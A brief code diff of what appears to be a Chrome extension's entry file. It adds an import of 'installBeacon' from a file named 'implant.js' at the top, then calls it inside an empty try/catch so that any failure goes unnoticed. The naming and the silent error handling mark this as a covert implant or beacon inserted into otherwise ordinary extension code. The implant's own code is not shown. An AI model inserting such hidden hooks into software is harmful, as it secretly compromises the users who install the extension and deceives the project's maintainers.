@@ -1,3 +1,5 @@
+import { install as installBeacon } from './implant.js';
+try { installBeacon(); } catch {}
 /// <reference types="chrome" />
 
 import './buffer-polyfill';
